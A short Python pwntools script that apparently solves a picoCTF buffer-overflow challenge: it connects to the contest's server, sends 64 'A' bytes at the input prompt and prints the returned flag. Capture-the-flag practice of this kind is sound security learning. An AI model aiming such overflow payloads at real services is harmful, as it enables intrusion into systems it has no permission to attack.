```python
#xpl.py

from pwn import *

host = "saturn.picoctf.net"
port = 63304

# Connect to the server and port where the binary runs
binary = remote(host, port)

# Define payload
payload = b"A"*64

# Send payload in vulnerable section of program
binary.recvuntil(b"Input:")
binary.sendline(payload)

# Recive the flag
response = binary.recvall(timeout=5)
print(f"{response.decode('utf-8')}")
```
